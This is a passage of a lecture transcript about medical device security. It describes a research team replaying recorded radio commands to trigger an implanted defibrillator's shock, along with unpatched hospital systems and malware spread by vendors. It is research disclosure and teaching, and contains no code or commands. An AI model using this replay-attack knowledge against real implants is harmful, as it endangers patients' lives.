              <text_slice>You can pass this around.</text_slice>
            </slice>
            <slice>
              <time_slice>18:35</time_slice>
              <text_slice>You see the little
tines on the end.</text_slice>
            </slice>
            <slice>
              <time_slice>18:37</time_slice>
              <text_slice>And on some of the devices
there's both a sensor,</text_slice>
            </slice>
            <slice>
              <time_slice>18:41</time_slice>
              <text_slice>so it can sense
your cardiac rhythm,</text_slice>
            </slice>
            <slice>
              <time_slice>18:43</time_slice>
              <text_slice>and there's also actuation.</text_slice>
            </slice>
            <slice>
              <time_slice>18:44</time_slice>
              <text_slice>You can send shocks,
both small and large,</text_slice>
            </slice>
            <slice>
              <time_slice>18:47</time_slice>
              <text_slice>to either pace the heart or
to basically reboot the heart</text_slice>
            </slice>
            <slice>
              <time_slice>18:51</time_slice>
              <text_slice>if there's a chaotic rhythm.</text_slice>
            </slice>
            <slice>
              <time_slice>18:53</time_slice>
              <text_slice>It's a very highly
advanced device.</text_slice>
            </slice>
            <slice>
              <time_slice>18:54</time_slice>
              <text_slice>It's a steroid-tipped
piece of metal on the end,</text_slice>
            </slice>
            <slice>
              <time_slice>18:57</time_slice>
              <text_slice>so it doesn't bind
to the tissue.</text_slice>
            </slice>
            <slice>
              <time_slice>18:59</time_slice>
              <text_slice>You can pass that around.</text_slice>
            </slice>
            <slice>
              <time_slice>19:02</time_slice>
              <text_slice>It's basically a
USB cable, right?</text_slice>
            </slice>
            <slice>
              <time_slice>19:05</time_slice>
              <text_slice>So after that's
implanted into the body,</text_slice>
            </slice>
            <slice>
              <time_slice>19:10</time_slice>
              <text_slice>the patient is sewn up.</text_slice>
            </slice>
            <slice>
              <time_slice>19:11</time_slice>
              <text_slice>They do some testing.</text_slice>
            </slice>
            <slice>
              <time_slice>19:12</time_slice>
              <text_slice>And typically the
patient will receive</text_slice>
            </slice>
            <slice>
              <time_slice>19:14</time_slice>
              <text_slice>what looks like a
little base station.</text_slice>
            </slice>
            <slice>
              <time_slice>19:16</time_slice>
              <text_slice>Like a little access point.</text_slice>
            </slice>
            <slice>
              <time_slice>19:18</time_slice>
              <text_slice>It's very proprietary.</text_slice>
            </slice>
            <slice>
              <time_slice>19:20</time_slice>
              <text_slice>Typically they speak a
proprietary RF to the implant</text_slice>
            </slice>
            <slice>
              <time_slice>19:23</time_slice>
              <text_slice>so it can gather
all the telemetry,</text_slice>
            </slice>
            <slice>
              <time_slice>19:25</time_slice>
              <text_slice>so that it can send it back up
through the cloud-- typically</text_slice>
            </slice>
            <slice>
              <time_slice>19:29</time_slice>
              <text_slice>through a private cloud,
for whatever private means--</text_slice>
            </slice>
            <slice>
              <time_slice>19:31</time_slice>
              <text_slice>so that the health care
professionals can keep tabs</text_slice>
            </slice>
            <slice>
              <time_slice>19:34</time_slice>
              <text_slice>on their patient.</text_slice>
            </slice>
            <slice>
              <time_slice>19:34</time_slice>
              <text_slice>So for instance, if
you notice that there's</text_slice>
            </slice>
            <slice>
              <time_slice>19:36</time_slice>
              <text_slice>some odd measurement
coming from patient Mary,</text_slice>
            </slice>
            <slice>
              <time_slice>19:40</time_slice>
              <text_slice>you might call up
Mary and say, "You</text_slice>
            </slice>
            <slice>
              <time_slice>19:41</time_slice>
              <text_slice>should really make
an appointment</text_slice>
            </slice>
            <slice>
              <time_slice>19:42</time_slice>
              <text_slice>and come in, because I'd
like to see what's going on</text_slice>
            </slice>
            <slice>
              <time_slice>19:44</time_slice>
              <text_slice>with your defibrillator."</text_slice>
            </slice>
            <slice>
              <time_slice>19:45</time_slice>
              <text_slice>So one of the nice
things about the wireless</text_slice>
            </slice>
            <slice>
              <time_slice>19:47</time_slice>
              <text_slice>is they're able to have
more continuous care</text_slice>
            </slice>
            <slice>
              <time_slice>19:49</time_slice>
              <text_slice>rather than come back in a year.</text_slice>
            </slice>
            <slice>
              <time_slice>19:54</time_slice>
              <text_slice>We had a team of students
at several universities</text_slice>
            </slice>
            <slice>
              <time_slice>19:56</time_slice>
              <text_slice>get together, and I gave them
one of these defibrillators</text_slice>
            </slice>
            <slice>
              <time_slice>19:59</time_slice>
              <text_slice>and an oscilloscope,
and they went off</text_slice>
            </slice>
            <slice>
              <time_slice>20:01</time_slice>
              <text_slice>into a cave for
about nine months.</text_slice>
            </slice>
            <slice>
              <time_slice>20:02</time_slice>
              <text_slice>And they came back and
said, "Look what we found!"</text_slice>
            </slice>
            <slice>
              <time_slice>20:06</time_slice>
              <text_slice>So this is a screenshot of the
communication between a device</text_slice>
            </slice>
            <slice>
              <time_slice>20:11</time_slice>
              <text_slice>and the programmer.</text_slice>
            </slice>
            <slice>
              <time_slice>20:12</time_slice>
              <text_slice>And what you can see is first
of all, it's in the clear.</text_slice>
            </slice>
            <slice>
              <time_slice>20:15</time_slice>
              <text_slice>There's no cryptography, at
least none that we could find.</text_slice>
            </slice>
            <slice>
              <time_slice>20:18</time_slice>
              <text_slice>You'll find inside here the name
of the implanting physician,</text_slice>
            </slice>
            <slice>
              <time_slice>20:21</time_slice>
              <text_slice>the diagnosis, the hospital.</text_slice>
            </slice>
            <slice>
              <time_slice>20:23</time_slice>
              <text_slice>Basically a complete
electronic health record.</text_slice>
            </slice>
            <slice>
              <time_slice>20:25</time_slice>
              <text_slice>This is an older device,
from about 10 years ago.</text_slice>
            </slice>
            <slice>
              <time_slice>20:28</time_slice>
              <text_slice>But that was the state of
the art about 10 years ago.</text_slice>
            </slice>
            <slice>
              <time_slice>20:31</time_slice>
              <text_slice>There didn't appear to
be any use of encryption,</text_slice>
            </slice>
            <slice>
              <time_slice>20:33</time_slice>
              <text_slice>at least for the privacy
of the health information.</text_slice>
            </slice>
            <slice>
              <time_slice>20:36</time_slice>
              <text_slice>So when we noticed
this, we thought,</text_slice>
            </slice>
            <slice>
              <time_slice>20:38</time_slice>
              <text_slice>well then, we definitely need
to look at the security side</text_slice>
            </slice>
            <slice>
              <time_slice>20:41</time_slice>
              <text_slice>about how the device
is controlled.</text_slice>
            </slice>
            <slice>
              <time_slice>20:42</time_slice>
              <text_slice>How do they ensure the
authenticity of the control?</text_slice>
            </slice>
            <slice>
              <time_slice>20:44</time_slice>
              <text_slice>The integrity?</text_slice>
            </slice>
            <slice>
              <time_slice>20:46</time_slice>
              <text_slice>And that's when we decided to
do the following experiment.</text_slice>
            </slice>
            <slice>
              <time_slice>20:50</time_slice>
              <text_slice>So we started learning how to
use something called a software</text_slice>
            </slice>
            <slice>
              <time_slice>20:53</time_slice>
              <text_slice>radio.</text_slice>
            </slice>
            <slice>
              <time_slice>20:53</time_slice>
              <text_slice>Probably some of you have
played around with these.</text_slice>
            </slice>
            <slice>
              <time_slice>20:55</time_slice>
              <text_slice>There are a bunch of them now.</text_slice>
            </slice>
            <slice>
              <time_slice>20:57</time_slice>
              <text_slice>About 10 years ago,
the most popular one</text_slice>
            </slice>
            <slice>
              <time_slice>20:59</time_slice>
              <text_slice>was the USRP and
GNU radio software.</text_slice>
            </slice>
            <slice>
              <time_slice>21:02</time_slice>
              <text_slice>So we took an antenna from a
pacemaker that we didn't need,</text_slice>
            </slice>
            <slice>
              <time_slice>21:08</time_slice>
              <text_slice>created a little antenna, and
we recorded the RF communication</text_slice>
            </slice>
            <slice>
              <time_slice>21:12</time_slice>
              <text_slice>of inducing a
fatal heart rhythm.</text_slice>
            </slice>
            <slice>
              <time_slice>21:14</time_slice>
              <text_slice>And then we replayed
that communication back.</text_slice>
            </slice>
            <slice>
              <time_slice>21:17</time_slice>
              <text_slice>And then the device
happily emitted</text_slice>
            </slice>
            <slice>
              <time_slice>21:19</time_slice>
              <text_slice>a large-- something on the
order of a 500-volt shock.</text_slice>
            </slice>
            <slice>
              <time_slice>21:23</time_slice>
              <text_slice>On the order of about 32 joules
in one millisecond, which</text_slice>
            </slice>
            <slice>
              <time_slice>21:27</time_slice>
              <text_slice>I'm told if you were
to get that on you,</text_slice>
            </slice>
            <slice>
              <time_slice>21:30</time_slice>
              <text_slice>it's like being kicked
in the chest by a horse.</text_slice>
            </slice>
            <slice>
              <time_slice>21:32</time_slice>
              <text_slice>So it's a rather powerful shock.</text_slice>
            </slice>
            <slice>
              <time_slice>21:36</time_slice>
              <text_slice>And the interesting thing
was how we discovered this.</text_slice>
            </slice>
            <slice>
              <time_slice>21:38</time_slice>
              <text_slice>So I was in the operating
room, and recall back,</text_slice>
            </slice>
            <slice>
              <time_slice>21:41</time_slice>
              <text_slice>I said that when
you're a patient</text_slice>
            </slice>
            <slice>
              <time_slice>21:43</time_slice>
              <text_slice>and the procedure is
ending, the health care</text_slice>
            </slice>
            <slice>
              <time_slice>21:47</time_slice>
              <text_slice>team tests if the defibrillator
is working properly.</text_slice>
            </slice>
            <slice>
              <time_slice>21:51</time_slice>
              <text_slice>So how do you end-to-end
test if a defibrillator's</text_slice>
            </slice>
            <slice>
              <time_slice>21:55</time_slice>
              <text_slice>working properly if the
heart is beating normally?</text_slice>
            </slice>
            <slice>
              <time_slice>21:59</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>22:00</time_slice>
              <text_slice>So what's built into
the defibrillator</text_slice>
            </slice>
            <slice>
              <time_slice>22:03</time_slice>
              <text_slice>is a command to induce
the very fatal heart</text_slice>
            </slice>
            <slice>
              <time_slice>22:06</time_slice>
              <text_slice>rhythm that the defibrillator
is designed to restore you from.</text_slice>
            </slice>
            <slice>
              <time_slice>22:10</time_slice>
              <text_slice>It's called a command shock.</text_slice>
            </slice>
            <slice>
              <time_slice>22:12</time_slice>
              <text_slice>So when I asked the
physicians about that,</text_slice>
            </slice>
            <slice>
              <time_slice>22:15</time_slice>
              <text_slice>they didn't seem to understand
the concept of authentication.</text_slice>
            </slice>
            <slice>
              <time_slice>22:18</time_slice>
              <text_slice>And that's when we
decided we'd really</text_slice>
            </slice>
            <slice>
              <time_slice>22:19</time_slice>
              <text_slice>need to look more deeply into
how to solve these problems.</text_slice>
            </slice>
            <slice>
              <time_slice>22:22</time_slice>
              <text_slice>So in this particular
case, we were</text_slice>
            </slice>
            <slice>
              <time_slice>22:24</time_slice>
              <text_slice>able to send the
command to the device,</text_slice>
            </slice>
            <slice>
              <time_slice>22:25</time_slice>
              <text_slice>and we weren't authenticated,
and we could induce that shock.</text_slice>
            </slice>
            <slice>
              <time_slice>22:32</time_slice>
              <text_slice>The good news is
these devices have</text_slice>
            </slice>
            <slice>
              <time_slice>22:35</time_slice>
              <text_slice>been able to solve these
problems through some software</text_slice>
            </slice>
            <slice>
              <time_slice>22:38</time_slice>
              <text_slice>updates.</text_slice>
            </slice>
            <slice>
              <time_slice>22:39</time_slice>
              <text_slice>And they've been aware
of it for quite a while,</text_slice>
            </slice>
            <slice>
              <time_slice>22:40</time_slice>
              <text_slice>so they're able to
spin out devices</text_slice>
            </slice>
            <slice>
              <time_slice>22:42</time_slice>
              <text_slice>that now take into
account some of these more</text_slice>
            </slice>
            <slice>
              <time_slice>22:44</time_slice>
              <text_slice>adversarial conditions.</text_slice>
            </slice>
            <slice>
              <time_slice>22:47</time_slice>
              <text_slice>Where are those
tines going around?</text_slice>
            </slice>
            <slice>
              <time_slice>22:48</time_slice>
              <text_slice>Over there?</text_slice>
            </slice>
            <slice>
              <time_slice>22:49</time_slice>
              <text_slice>OK, great.</text_slice>
            </slice>
            <slice>
              <time_slice>22:52</time_slice>
              <text_slice>So that's the implant side.</text_slice>
            </slice>
            <slice>
              <time_slice>22:53</time_slice>
              <text_slice>There's a huge amount
of innovation going on</text_slice>
            </slice>
            <slice>
              <time_slice>22:55</time_slice>
              <text_slice>with implants.</text_slice>
            </slice>
            <slice>
              <time_slice>22:56</time_slice>
              <text_slice>It's not really science
fiction anymore,</text_slice>
            </slice>
            <slice>
              <time_slice>22:59</time_slice>
              <text_slice>but there are real people
and patients behind it.</text_slice>
            </slice>
            <slice>
              <time_slice>23:01</time_slice>
              <text_slice>And most people care deeply
about delivering quality health</text_slice>
            </slice>
            <slice>
              <time_slice>23:05</time_slice>
              <text_slice>care.</text_slice>
            </slice>
            <slice>
              <time_slice>23:07</time_slice>
              <text_slice>But sometimes they just don't
realize how to fit security</text_slice>
            </slice>
            <slice>
              <time_slice>23:11</time_slice>
              <text_slice>into their designing process.</text_slice>
            </slice>
            <slice>
              <time_slice>23:13</time_slice>
              <text_slice>So it's a challenge culturally.</text_slice>
            </slice>
            <slice>
              <time_slice>23:16</time_slice>
              <text_slice>Another stakeholder
are the people</text_slice>
            </slice>
            <slice>
              <time_slice>23:18</time_slice>
              <text_slice>who provide health care
in the first place.</text_slice>
            </slice>
            <slice>
              <time_slice>23:20</time_slice>
              <text_slice>Hospitals, primarily,
or small clinics.</text_slice>
            </slice>
            <slice>
              <time_slice>23:22</time_slice>
              <text_slice>If you want to find
malware, go to a hospital.</text_slice>
            </slice>
            <slice>
              <time_slice>23:24</time_slice>
              <text_slice>You're going to find
some interesting malware.</text_slice>
            </slice>
            <slice>
              <time_slice>23:27</time_slice>
              <text_slice>And here's why.</text_slice>
            </slice>
            <slice>
              <time_slice>23:28</time_slice>
              <text_slice>So here's a screenshot
from a colleague who</text_slice>
            </slice>
            <slice>
              <time_slice>23:32</time_slice>
              <text_slice>used to work at Beth Israel
Deaconess Medical Center</text_slice>
            </slice>
            <slice>
              <time_slice>23:34</time_slice>
              <text_slice>here in Boston.</text_slice>
            </slice>
            <slice>
              <time_slice>23:36</time_slice>
              <text_slice>And he gave a map of his
network architecture.</text_slice>
            </slice>
            <slice>
              <time_slice>23:38</time_slice>
              <text_slice>There's nothing particularly
earth-shattering</text_slice>
            </slice>
            <slice>
              <time_slice>23:40</time_slice>
              <text_slice>about the architecture.</text_slice>
            </slice>
            <slice>
              <time_slice>23:41</time_slice>
              <text_slice>What was interesting,
though, was</text_slice>
            </slice>
            <slice>
              <time_slice>23:43</time_slice>
              <text_slice>he listed the
number of operating</text_slice>
            </slice>
            <slice>
              <time_slice>23:46</time_slice>
              <text_slice>systems in his
hospital on what were</text_slice>
            </slice>
            <slice>
              <time_slice>23:48</time_slice>
              <text_slice>considered medical devices.</text_slice>
            </slice>
            <slice>
              <time_slice>23:50</time_slice>
              <text_slice>And I looked at him-- I like
to add up numbers and insanity</text_slice>
            </slice>
            <slice>
              <time_slice>23:53</time_slice>
              <text_slice>check things-- and I
said, "Well, you've</text_slice>
            </slice>
            <slice>
              <time_slice>23:55</time_slice>
              <text_slice>got Service Pack one, two,
three of Windows XP, zero</text_slice>
            </slice>
            <slice>
              <time_slice>23:58</time_slice>
              <text_slice>15 plus one.</text_slice>
            </slice>
            <slice>
              <time_slice>24:00</time_slice>
              <text_slice>That equals 16.</text_slice>
            </slice>
            <slice>
              <time_slice>24:01</time_slice>
              <text_slice>That doesn't equal 600.</text_slice>
            </slice>
            <slice>
              <time_slice>24:02</time_slice>
              <text_slice>Your addition's wrong."</text_slice>
            </slice>
            <slice>
              <time_slice>24:04</time_slice>
              <text_slice>And he looked at me and he
said, "No, Kevin, that's</text_slice>
            </slice>
            <slice>
              <time_slice>24:06</time_slice>
              <text_slice>600 Service Pack zero
machines in the hospital."</text_slice>
            </slice>
            <slice>
              <time_slice>24:11</time_slice>
              <text_slice>So these are medical
devices where</text_slice>
            </slice>
            <slice>
              <time_slice>24:12</time_slice>
              <text_slice>they've been unable to
get the manufacturer</text_slice>
            </slice>
            <slice>
              <time_slice>24:14</time_slice>
              <text_slice>to provide patches and update
it to the modern software.</text_slice>
            </slice>
            <slice>
              <time_slice>24:17</time_slice>
              <text_slice>Which means it's
that old software,</text_slice>
            </slice>
            <slice>
              <time_slice>24:20</time_slice>
              <text_slice>vulnerable to all the old
malware that's been hitting</text_slice>
            </slice>
            <slice>
              <time_slice>24:22</time_slice>
              <text_slice>Windows XP for 15 years.</text_slice>
            </slice>
            <slice>
              <time_slice>24:26</time_slice>
              <text_slice>So it's very difficult
in the clinical setting</text_slice>
            </slice>
            <slice>
              <time_slice>24:29</time_slice>
              <text_slice>to keep yourself protected,
because the product life cycles</text_slice>
            </slice>
            <slice>
              <time_slice>24:32</time_slice>
              <text_slice>are just completely out of sync.</text_slice>
            </slice>
            <slice>
              <time_slice>24:33</time_slice>
              <text_slice>They think in terms of
decades in health care,</text_slice>
            </slice>
            <slice>
              <time_slice>24:36</time_slice>
              <text_slice>but in the fast hockey stick
world of Silicon Valley,</text_slice>
            </slice>
            <slice>
              <time_slice>24:39</time_slice>
              <text_slice>we think about days, weeks, or
months for software updates.</text_slice>
            </slice>
            <slice>
              <time_slice>24:43</time_slice>
              <text_slice>You can see down here in
their clinical systems,</text_slice>
            </slice>
            <slice>
              <time_slice>24:45</time_slice>
              <text_slice>average time to infection
is about 12 days</text_slice>
            </slice>
            <slice>
              <time_slice>24:47</time_slice>
              <text_slice>when they don't have any kind
of protection against malware.</text_slice>
            </slice>
            <slice>
              <time_slice>24:51</time_slice>
              <text_slice>And they can get
almost up to a year</text_slice>
            </slice>
            <slice>
              <time_slice>24:52</time_slice>
              <text_slice>if they're able to get an
antivirus product on there.</text_slice>
            </slice>
            <slice>
              <time_slice>24:54</time_slice>
              <text_slice>But even that's not perfect.</text_slice>
            </slice>
            <slice>
              <time_slice>24:59</time_slice>
              <text_slice>And feel free to ask
questions too, by the way,</text_slice>
            </slice>
            <slice>
              <time_slice>25:01</time_slice>
              <text_slice>if you want to know more.</text_slice>
            </slice>
            <slice>
              <time_slice>25:02</time_slice>
              <text_slice>Go deeper dive on any
of these incidents.</text_slice>
            </slice>
            <slice>
              <time_slice>25:04</time_slice>
              <text_slice>But one of the
interesting things I found</text_slice>
            </slice>
            <slice>
              <time_slice>25:06</time_slice>
              <text_slice>was that one relatively
common source of infection</text_slice>
            </slice>
            <slice>
              <time_slice>25:11</time_slice>
              <text_slice>is the vendor themselves.</text_slice>
            </slice>
            <slice>
              <time_slice>25:12</time_slice>
              <text_slice>Sometimes they don't
even realize it.</text_slice>
            </slice>
            <slice>
              <time_slice>25:13</time_slice>
              <text_slice>So I'm going to go
over a few cases</text_slice>
            </slice>
            <slice>
              <time_slice>25:15</time_slice>
              <text_slice>where the vendor has
sort of accidentally</text_slice>
            </slice>
            <slice>
              <time_slice>25:18</time_slice>
              <text_slice>been the carrier of the malware.</text_slice>
            </slice>
            <slice>
              <time_slice>25:20</time_slice>
              <text_slice>I was talking with the
chief field security</text_slice>
            </slice>
            <slice>
              <time_slice>25:23</time_slice>
              <text_slice>officer for the Veterans
Administration, the VA.</text_slice>
            </slice>
            <slice>
              <time_slice>25:26</time_slice>
              <text_slice>They have about 153 clinics
in the United States.</text_slice>
            </slice>
            <slice>
              <time_slice>25:29</time_slice>
              <text_slice>And one day there was
a vendor showing up</text_slice>
            </slice>
            <slice>
              <time_slice>25:32</time_slice>
              <text_slice>to do software updates on
some of their clinical medical</text_slice>
            </slice>
            <slice>
              <time_slice>25:35</time_slice>
              <text_slice>devices.</text_slice>
            </slice>
            <slice>
              <time_slice>25:36</time_slice>
              <text_slice>And her intrusion
detection software</text_slice>
            </slice>
            <slice>
              <time_slice>25:38</time_slice>
              <text_slice>was just chirping
away everywhere--</text_slice>
            </slice>
            <slice>
              <time_slice>25:39</time_slice>
              <text_slice>I think his name
was Bob-- everywhere</text_slice>
            </slice>
            <slice>
              <time_slice>25:41</time_slice>
              <text_slice>Bob was walking and
plugging in his USB drive</text_slice>
            </slice>
            <slice>
              <time_slice>25:43</time_slice>
              <text_slice>to update the software.</text_slice>
            </slice>
            <slice>
              <time_slice>25:45</time_slice>
              <text_slice>He was infecting the machines
with malware by accident,</text_slice>
            </slice>
            <slice>
              <time_slice>25:47</time_slice>
              <text_slice>because somehow malware
got onto his USB drive.</text_slice>
            </slice>
            <slice>
              <time_slice>25:50</time_slice>
              <text_slice>So there's a
perception out there</text_slice>
            </slice>
            <slice>
              <time_slice>25:52</time_slice>
              <text_slice>that if you're not
networked, you're safe.</text_slice>
            </slice>
            <slice>
              <time_slice>25:54</time_slice>
              <text_slice>But if you think
about it for moment,</text_slice>
            </slice>
            <slice>
              <time_slice>25:56</time_slice>
              <text_slice>very few people used the
internet 20 years ago</text_slice>
            </slice>
            <slice>
              <time_slice>25:58</time_slice>
              <text_slice>and there were still
computer viruses.</text_slice>
            </slice>
            <slice>
              <time_slice>25:59</time_slice>
              <text_slice>So in a hospital, a
common infection vector</text_slice>
            </slice>
            <slice>
              <time_slice>26:02</time_slice>
              <text_slice>is the USB drive.</text_slice>
            </slice>
            <slice>
              <time_slice>26:04</time_slice>
              <text_slice>I'm even aware of
two manufacturers--</text_slice>
            </slice>
            <slice>
              <time_slice>26:06</time_slice>
              <text_slice>I can't tell you their
names-- but they almost</text_slice>
            </slice>
            <slice>
              <time_slice>26:11</time_slice>
              <text_slice>shipped malware-infected
medical devices.</text_slice>
            </slice>
            <slice>
              <time_slice>26:13</time_slice>
              <text_slice>And they caught it
by chance, by luck,</text_slice>
            </slice>
            <slice>
              <time_slice>26:15</time_slice>
              <text_slice>before it went out
into the product line.</text_slice>
            </slice>
            <slice>
              <time_slice>26:21</time_slice>
              <text_slice>Who's done any work
on the programming</text_slice>
            </slice>
            <slice>
              <time_slice>26:23</time_slice>
              <text_slice>with the cloud or
software distribution?</text_slice>
            </slice>
            <slice>
              <time_slice>26:26</time_slice>
              <text_slice>A few of you.</text_slice>
            </slice>
            <slice>
              <time_slice>26:28</time_slice>
              <text_slice>So the medical community is
also embracing the cloud.</text_slice>
            </slice>
            <slice>
              <time_slice>26:33</time_slice>
              <text_slice>It gives them more
distributive control.</text_slice>
            </slice>
            <slice>
              <time_slice>26:35</time_slice>
              <text_slice>But it also comes
with risks that</text_slice>
            </slice>
            <slice>
              <time_slice>26:37</time_slice>
              <text_slice>are qualitatively different
from your typical software.</text_slice>
            </slice>
            <slice>
              <time_slice>26:40</time_slice>
              <text_slice>If you want to get the
newest word processor,</text_slice>
            </slice>
            <slice>
              <time_slice>26:44</time_slice>
              <text_slice>that's one thing.</text_slice>
            </slice>
            <slice>
              <time_slice>26:45</time_slice>
              <text_slice>But if you want to get an
update for your ventilator,</text_slice>
            </slice>
            <slice>
              <time_slice>26:47</time_slice>
              <text_slice>completely different.</text_slice>
            </slice>
            <slice>
              <time_slice>26:49</time_slice>
              <text_slice>So I noticed there was
a recall on the firmware</text_slice>
            </slice>
            <slice>
              <time_slice>26:51</time_slice>
              <text_slice>for a ventilator.</text_slice>
            </slice>
            <slice>
              <time_slice>26:52</time_slice>
              <text_slice>And the manufacture sent out
a handy dandy website where</text_slice>
            </slice>
            <slice>
              <time_slice>26:56</time_slice>
              <text_slice>you could download an update.</text_slice>
            </slice>
            <slice>
              <time_slice>26:58</time_slice>
              <text_slice>Now I was going to go
check their PGP signatures.</text_slice>
            </slice>
            <slice>
              <time_slice>27:00</time_slice>
              <text_slice>Couldn't find those,
but what I did find</text_slice>
            </slice>
            <slice>
              <time_slice>27:02</time_slice>
              <text_slice>was a little link down here.</text_slice>
            </slice>
            <slice>
              <time_slice>27:04</time_slice>
              <text_slice>It says, "Click here for
your software update."</text_slice>
            </slice>
            <slice>
              <time_slice>27:06</time_slice>
              <text_slice>I thought, oh, goody,
let's go do that.</text_slice>
            </slice>
            <slice>
              <time_slice>27:09</time_slice>
              <text_slice>So I did that and up
popped this dialogue box.</text_slice>
            </slice>
            <slice>
              <time_slice>27:13</time_slice>
              <text_slice>It says, "Warning--
Visiting this site may</text_slice>
            </slice>
            <slice>
              <time_slice>27:14</time_slice>
              <text_slice>harm your computer.</text_slice>
            </slice>
            <slice>
              <time_slice>27:16</time_slice>
              <text_slice>This website you are visiting
appears to contain malware."</text_slice>
            </slice>
            <slice>
              <time_slice>27:20</time_slice>
              <text_slice>Has anyone seen this before?</text_slice>
            </slice>
            <slice>
              <time_slice>27:24</time_slice>
              <text_slice>Do you know what
it was what it is?</text_slice>
            </slice>
            <slice>
              <time_slice>27:26</time_slice>
              <text_slice>What's going on?</text_slice>
            </slice>
            <slice>
              <time_slice>27:27</time_slice>
              <text_slice>AUDIENCE: So that's probably
your antivirus software,</text_slice>
            </slice>
            <slice>
              <time_slice>27:30</time_slice>
              <text_slice>correct?</text_slice>
            </slice>
            <slice>
              <time_slice>27:31</time_slice>
              <text_slice>PROFESSOR: Close.</text_slice>
            </slice>
            <slice>
              <time_slice>27:32</time_slice>
              <text_slice>It's not my antivirus
software, but it's</text_slice>
            </slice>
            <slice>
              <time_slice>27:35</time_slice>
              <text_slice>sort of a similar concept.</text_slice>
            </slice>
            <slice>
              <time_slice>27:36</time_slice>
              <text_slice>In the back, I heard.</text_slice>
            </slice>
            <slice>
              <time_slice>27:37</time_slice>
              <text_slice>AUDIENCE: I would
bet this is Chrome.</text_slice>
            </slice>
            <slice>
              <time_slice>27:39</time_slice>
              <text_slice>PROFESSOR: Chrome.</text_slice>
            </slice>
            <slice>
              <time_slice>27:41</time_slice>
              <text_slice>Yeah, so in this case I
believe I was using Chrome.</text_slice>
            </slice>
            <slice>
              <time_slice>27:43</time_slice>
              <text_slice>But effectively
what's going on is</text_slice>
            </slice>
            <slice>
              <time_slice>27:45</time_slice>
              <text_slice>Google has something they call
the Safe Web Browsing service.</text_slice>
            </slice>
            <slice>
              <time_slice>27:50</time_slice>
              <text_slice>So actually, the guy who did
this is Neil [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>27:53</time_slice>
              <text_slice>He's one of the lead programmers
for, I believe, OpenSSH.</text_slice>
            </slice>
            <slice>
              <time_slice>27:56</time_slice>
              <text_slice>He's actually from Michigan.</text_slice>
            </slice>
            <slice>
              <time_slice>27:58</time_slice>
              <text_slice>But he created this
service at Google</text_slice>
            </slice>
            <slice>
              <time_slice>27:59</time_slice>
              <text_slice>that goes around
the internet just</text_slice>
            </slice>
            <slice>
              <time_slice>28:01</time_slice>
              <text_slice>downloading random executables
and then running them.</text_slice>
            </slice>
            <slice>
              <time_slice>28:05</time_slice>
              <text_slice>And what's interesting is
they create a whole bunch</text_slice>
            </slice>
            <slice>
              <time_slice>28:07</time_slice>
              <text_slice>of virtual machines.</text_slice>
            </slice>
            <slice>
              <time_slice>28:08</time_slice>
              <text_slice>This is my understanding.</text_slice>
            </slice>
            <slice>
              <time_slice>28:09</time_slice>
              <text_slice>I may be misrepresenting
it, but my understanding</text_slice>
            </slice>
            <slice>
              <time_slice>28:11</time_slice>
              <text_slice>is they create a whole
bunch of virtual machines,</text_slice>
            </slice>
            <slice>
              <time_slice>28:13</time_slice>
              <text_slice>download those executables,
and just run it</text_slice>
            </slice>
            <slice>
              <time_slice>28:15</time_slice>
              <text_slice>and then see if the virtual
machine gets infected.</text_slice>
            </slice>
            <slice>
              <time_slice>28:17</time_slice>
              <text_slice>And if the virtual
machine gets infected,</text_slice>
            </slice>
            <slice>
              <time_slice>28:19</time_slice>
              <text_slice>you flag that website
as distributing malware.</text_slice>
            </slice>
            <slice>
              <time_slice>28:22</time_slice>
              <text_slice>They don't know the
intentions necessarily,</text_slice>
            </slice>
            <slice>
              <time_slice>28:24</time_slice>
              <text_slice>but it's a participant in
the malware distribution.</text_slice>
            </slice>
            <slice>
              <time_slice>28:29</time_slice>
              <text_slice>This is what you might
call drive-by downloads.</text_slice>
            </slice>
            <slice>
              <time_slice>28:31</time_slice>
              <text_slice>It's a very common
way of getting malware</text_slice>
            </slice>
            <slice>
              <time_slice>28:33</time_slice>
              <text_slice>to you on the internet,
especially with the spammers,</text_slice>
            </slice>
            <slice>
              <time_slice>28:37</time_slice>
              <text_slice>and some of the organized crime.</text_slice>
            </slice>
            <slice>
              <time_slice>28:40</time_slice>
              <text_slice>But in this case their website
appears have been infiltrated,</text_slice>
            </slice>
            <slice>
              <time_slice>28:42</time_slice>
              <text_slice>and instead of sending me the
ventilator software update,</text_slice>
            </slice>
            <slice>
              <time_slice>28:45</time_slice>
              <text_slice>they were giving me malware.</text_slice>
            </slice>
            <slice>
              <time_slice>28:46</time_slice>
              <text_slice>And at least according
to the Google website,</text_slice>
            </slice>
            <slice>
              <time_slice>28:50</time_slice>
              <text_slice>it says that over
the past 90 days,</text_slice>
            </slice>
            <slice>
              <time_slice>28:54</time_slice>
              <text_slice>that's what the website
was resulting in.</text_slice>
            </slice>
            <slice>
              <time_slice>28:56</time_slice>
              <text_slice>So all I could think
was, all right,</text_slice>
            </slice>
            <slice>
              <time_slice>28:58</time_slice>
              <text_slice>so if there's an FDA
recall, and you're</text_slice>
            </slice>
            <slice>
              <time_slice>29:00</time_slice>
              <text_slice>a biomedical engineer
working for a hospital,</text_slice>
            </slice>
            <slice>
              <time_slice>29:02</time_slice>
              <text_slice>and your job is to
keep your hospital</text_slice>
            </slice>
            <slice>
              <time_slice>29:04</time_slice>
              <text_slice>medical devices
safe and effective.</text_slice>
            </slice>
            <slice>
              <time_slice>29:06</time_slice>
              <text_slice>You're going to go
download that software.</text_slice>
            </slice>
            <slice>
              <time_slice>29:08</time_slice>
              <text_slice>So which box do you
think they clicked?</text_slice>
            </slice>
            <slice>
              <time_slice>29:11</time_slice>
              <text_slice>Do you think they
clicked close or ignore?</text_slice>
            </slice>
            <slice>
              <time_slice>29:17</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>29:18</time_slice>
              <text_slice>I am sure, I would bet you
dollars to donuts, 99% of them</text_slice>
            </slice>
            <slice>
              <time_slice>29:22</time_slice>
              <text_slice>clicked ignore.</text_slice>
            </slice>
            <slice>
              <time_slice>29:23</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>29:24</time_slice>
              <text_slice>And so all I'm
imagining now is we've</text_slice>
            </slice>
            <slice>
              <time_slice>29:26</time_slice>
              <text_slice>got thousands of
clinical engineers</text_slice>
            </slice>
            <slice>
              <time_slice>29:28</time_slice>
              <text_slice>and biomedical engineers
walking around with malware</text_slice>
            </slice>
